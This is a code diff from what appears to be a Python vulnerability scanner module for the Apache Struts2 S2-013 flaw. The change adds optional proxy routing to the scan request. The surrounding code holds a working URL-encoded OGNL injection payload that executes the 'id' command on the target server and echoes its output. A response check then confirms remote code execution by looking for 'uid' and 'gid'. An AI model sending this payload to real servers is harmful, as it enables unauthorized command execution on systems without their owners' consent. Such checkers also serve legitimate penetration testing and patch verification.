@@ -15,7 +15,7 @@ def UrlProcessing(url):
 
 
 payload='''a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D'''
-def S2_013(Url,RandomAgent):
+def S2_013(Url,RandomAgent,ProxyIp):
 
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
@@ -40,7 +40,14 @@ def S2_013(Url,RandomAgent):
     }
     s = requests.session()
     try:
-        resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
+        if ProxyIp != None:
+            proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+                "http": "http://" + str(ProxyIp)
+            }
+            resp = s.get(payload_url, headers=headers, proxies=proxies,timeout=5, verify=False)
+        elif ProxyIp == None:
+            resp = s.get(payload_url,headers=headers, timeout=5, verify=False)
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('uid')!=-1 and con.lower().find('gid')!=-1:
